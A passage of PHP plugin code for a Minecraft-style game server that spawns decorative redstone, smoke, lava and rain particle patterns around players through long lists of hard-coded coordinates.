					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 0.4, $z + 0.6)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 1.8, $z - 0.4)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 1.8, $z + 0.4)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 1.6, $z - 0.4)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 1.6, $z + 0.4)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 1.6, $z - 0.6)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 1.6, $z + 0.6)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 1.4, $z - 0.4)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 1.4, $z + 0.4)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 1.4, $z - 0.2)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 1.4, $z + 0.2)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 1.2, $z - 0.2)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 1.2, $z)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 1.2, $z + 0.2)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 1, $z - 0.2)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 1, $z)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 1, $z + 0.2)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 0.8, $z - 0.2)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 0.8, $z)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 0.8, $z + 0.2)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 0.6, $z - 0.4)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 0.6, $z)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 0.6, $z + 0.4)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 0.4, $z - 0.6)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 0.4, $z + 0.6)));
					
				} elseif ($player->getDirection() === 1) {
					
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.4, $y + 2, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.4, $y + 2, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.6, $y + 1.8, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.6, $y + 1.8, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.8, $y + 1.6, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.8, $y + 1.6, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.2, $y + 1.6, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.2, $y + 1.6, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.6, $y + 1.4, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x, $y + 1.4, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.6, $y + 1.4, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.4, $y + 1.2, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.4, $y + 1.2, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.4, $y + 1, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.4, $y + 1, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.6, $y + 0.8, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.6, $y + 0.8, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.2, $y + 0.8, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.2, $y + 0.8, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.4, $y + 0.6, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x, $y + 0.6, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.4, $y + 0.6, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.4, $y + 0.4, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 0.4, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.6, $y + 0.4, $z - 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.6, $y + 0.4, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 1.8, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 1.8, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 1.6, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 1.6, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.6, $y + 1.6, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.6, $y + 1.6, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 1.4, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 1.4, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 1.4, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 1.4, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 1.2, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x , $y + 1.2, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 1.2, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 1, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x, $y + 1, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 1, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 0.8, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x, $y + 0.8, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 0.8, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 0.6, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x, $y + 0.6, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 0.6, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.6, $y + 0.4, $z - 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.6, $y + 0.4, $z - 0.3)));
					
				} elseif ($player->getDirection() === 3) {
					
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.4, $y + 2, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.4, $y + 2, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.6, $y + 1.8, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.6, $y + 1.8, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.8, $y + 1.6, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.8, $y + 1.6, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.2, $y + 1.6, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.2, $y + 1.6, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.6, $y + 1.4, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x, $y + 1.4, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.6, $y + 1.4, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.4, $y + 1.2, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.4, $y + 1.2, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.4, $y + 1, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.4, $y + 1, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.6, $y + 0.8, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.6, $y + 0.8, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.2, $y + 0.8, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.2, $y + 0.8, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.4, $y + 0.6, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x, $y + 0.6, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.4, $y + 0.6, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.4, $y + 0.4, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 0.4, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.6, $y + 0.4, $z + 0.3)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.6, $y + 0.4, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 1.8, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 1.8, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 1.6, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 1.6, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.6, $y + 1.6, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.6, $y + 1.6, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 1.4, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 1.4, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 1.4, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 1.4, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 1.2, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x , $y + 1.2, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 1.2, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 1, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x, $y + 1, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 1, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 0.8, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x, $y + 0.8, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 0.8, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 0.6, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x, $y + 0.6, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 0.6, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.6, $y + 0.4, $z + 0.3)));
					$level->addParticle(new SmokeParticle(new Vector3($x + 0.6, $y + 0.4, $z + 0.3)));					
				}
			}
			
			//lava
			if(in_array($name, $this->plugin->particle11)) {
				
				$px = $player->getX();
				$py = $player->getY();
				$pz = $player->getZ();
				
				$level->addParticle(new LavaParticle(new Vector3($px, $py + 1 + lcg_value(), $pz)));
				$level->addParticle(new LavaParticle(new Vector3($px, $py + 1 + lcg_value(), $pz)));
				$level->addParticle(new LavaParticle(new Vector3($px, $py + 1 + lcg_value(), $pz)));
				$level->addParticle(new LavaParticle(new Vector3($px, $py + 1 + lcg_value(), $pz)));
				$level->addParticle(new LavaParticle(new Vector3($px, $py + 1 + lcg_value(), $pz)));
				$level->addParticle(new LavaParticle(new Vector3($px, $py + 1 + lcg_value(), $pz)));
				$level->addParticle(new LavaParticle(new Vector3($px, $py + 1 + lcg_value(), $pz)));
				$level->addParticle(new LavaParticle(new Vector3($px, $py + 1 + lcg_value(), $pz)));
				$level->addParticle(new LavaParticle(new Vector3($px, $py + 1 + lcg_value(), $pz)));
				$level->addParticle(new LavaParticle(new Vector3($px, $py + 1 + lcg_value(), $pz)));
				$level->addParticle(new LavaParticle(new Vector3($px, $py + 1 + lcg_value(), $pz)));
				$level->addParticle(new LavaParticle(new Vector3($px, $py + 1 + lcg_value(), $pz)));
				$level->addParticle(new LavaParticle(new Vector3($px, $py + 1 + lcg_value(), $pz)));
				$level->addParticle(new LavaParticle(new Vector3($px, $py + 1 + lcg_value(), $pz)));
				$level->addParticle(new LavaParticle(new Vector3($px, $py + 1 + lcg_value(), $pz)));
				$distance = -0.5 + lcg_value();
				$yaw = $player->yaw * M_PI / 180;
				$x = $distance * cos($yaw);
				$z = $distance * sin($yaw);
				$level->addParticle(new LavaDripParticle(new Vector3($px + $x, $py + 0.2, $pz + $z)));
				
			}
			//rain
			if(in_array($name, $this->plugin->particle10)) {
				
				$x = $player->getX();
				$y = $player->getY();
				$z = $player->getZ();
				
				$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.1, $y + 2.5, $z)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 2.5, $z)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 2.5, $z)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 2.5, $z)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.5, $y + 2.5, $z)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.6, $y + 2.5, $z)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.7, $y + 2.5, $z)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.8, $y + 2.5, $z)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.9, $y + 2.5, $z)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 1, $y + 2.5, $z)));
				
				$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.1, $y + 2.5, $z)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 2.5, $z)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 2.5, $z)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 2.5, $z)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.5, $y + 2.5, $z)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.6, $y + 2.5, $z)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.7, $y + 2.5, $z)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.8, $y + 2.5, $z)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.9, $y + 2.5, $z)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 1, $y + 2.5, $z)));
				
				$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z + 0.1)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.1, $y + 2.5, $z + 0.1)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 2.5, $z + 0.1)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 2.5, $z + 0.1)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 2.5, $z + 0.1)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.5, $y + 2.5, $z + 0.1)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.6, $y + 2.5, $z + 0.1)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.7, $y + 2.5, $z + 0.1)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.8, $y + 2.5, $z + 0.1)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.9, $y + 2.5, $z + 0.1)));
				
				$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z + 0.1)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.1, $y + 2.5, $z + 0.1)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 2.5, $z + 0.1)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 2.5, $z + 0.1)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 2.5, $z + 0.1)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.5, $y + 2.5, $z + 0.1)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.6, $y + 2.5, $z + 0.1)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.7, $y + 2.5, $z + 0.1)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.8, $y + 2.5, $z + 0.1)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.9, $y + 2.5, $z + 0.1)));
				
				$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z + 0.2)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.1, $y + 2.5, $z + 0.2)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 2.5, $z + 0.2)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 2.5, $z + 0.2)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 2.5, $z + 0.2)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.5, $y + 2.5, $z + 0.2)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.6, $y + 2.5, $z + 0.2)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.7, $y + 2.5, $z + 0.2)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.8, $y + 2.5, $z + 0.2)));
				$level->addParticle(new SmokeParticle(new Vector3($x + 0.9, $y + 2.5, $z + 0.2)));
				
				$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z + 0.2)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.1, $y + 2.5, $z + 0.2)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 2.5, $z + 0.2)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 2.5, $z + 0.2)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 2.5, $z + 0.2)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.5, $y + 2.5, $z + 0.2)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.6, $y + 2.5, $z + 0.2)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.7, $y + 2.5, $z + 0.2)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.8, $y + 2.5, $z + 0.2)));
				$level->addParticle(new SmokeParticle(new Vector3($x - 0.9, $y + 2.5, $z + 0.2)));
				
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z + 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.1, $y + 2.5, $z + 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 2.5, $z + 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 2.5, $z + 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 2.5, $z + 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.5, $y + 2.5, $z + 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.6, $y + 2.5, $z + 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.7, $y + 2.5, $z + 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.8, $y + 2.5, $z + 0.3)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z + 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.1, $y + 2.5, $z + 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 2.5, $z + 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 2.5, $z + 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 2.5, $z + 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.5, $y + 2.5, $z + 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.6, $y + 2.5, $z + 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.7, $y + 2.5, $z + 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.8, $y + 2.5, $z + 0.3)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z + 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.1, $y + 2.5, $z + 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 2.5, $z + 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 2.5, $z + 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 2.5, $z + 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.5, $y + 2.5, $z + 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.6, $y + 2.5, $z + 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.7, $y + 2.5, $z + 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.8, $y + 2.5, $z + 0.4)));
 		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z + 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.1, $y + 2.5, $z + 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 2.5, $z + 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 2.5, $z + 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 2.5, $z + 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.5, $y + 2.5, $z + 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.6, $y + 2.5, $z + 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.7, $y + 2.5, $z + 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.8, $y + 2.5, $z + 0.4)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z + 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.1, $y + 2.5, $z + 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 2.5, $z + 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 2.5, $z + 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 2.5, $z + 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.5, $y + 2.5, $z + 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.6, $y + 2.5, $z + 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.7, $y + 2.5, $z + 0.5)));
 		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z + 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.1, $y + 2.5, $z + 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 2.5, $z + 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 2.5, $z + 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 2.5, $z + 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.5, $y + 2.5, $z + 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.6, $y + 2.5, $z + 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.7, $y + 2.5, $z + 0.5)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z + 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.1, $y + 2.5, $z + 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 2.5, $z + 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 2.5, $z + 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 2.5, $z + 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.5, $y + 2.5, $z + 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.6, $y + 2.5, $z + 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.7, $y + 2.5, $z + 0.6)));
 		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z + 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.1, $y + 2.5, $z + 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 2.5, $z + 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 2.5, $z + 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 2.5, $z + 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.5, $y + 2.5, $z + 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.6, $y + 2.5, $z + 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.7, $y + 2.5, $z + 0.6)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z + 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.1, $y + 2.5, $z + 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 2.5, $z + 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 2.5, $z + 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 2.5, $z + 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.5, $y + 2.5, $z + 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.6, $y + 2.5, $z + 0.7)));		
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z + 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.1, $y + 2.5, $z + 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 2.5, $z + 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 2.5, $z + 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 2.5, $z + 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.5, $y + 2.5, $z + 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.6, $y + 2.5, $z + 0.7)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z + 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.1, $y + 2.5, $z + 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 2.5, $z + 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 2.5, $z + 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 2.5, $z + 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.5, $y + 2.5, $z + 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.6, $y + 2.5, $z + 0.8)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z + 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.1, $y + 2.5, $z + 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 2.5, $z + 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 2.5, $z + 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 2.5, $z + 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.5, $y + 2.5, $z + 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.6, $y + 2.5, $z + 0.8)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z + 0.9)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.1, $y + 2.5, $z + 0.9)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 2.5, $z + 0.9)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 2.5, $z + 0.9)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 2.5, $z + 0.9)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.5, $y + 2.5, $z + 0.9)));
		 
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z + 0.9)));
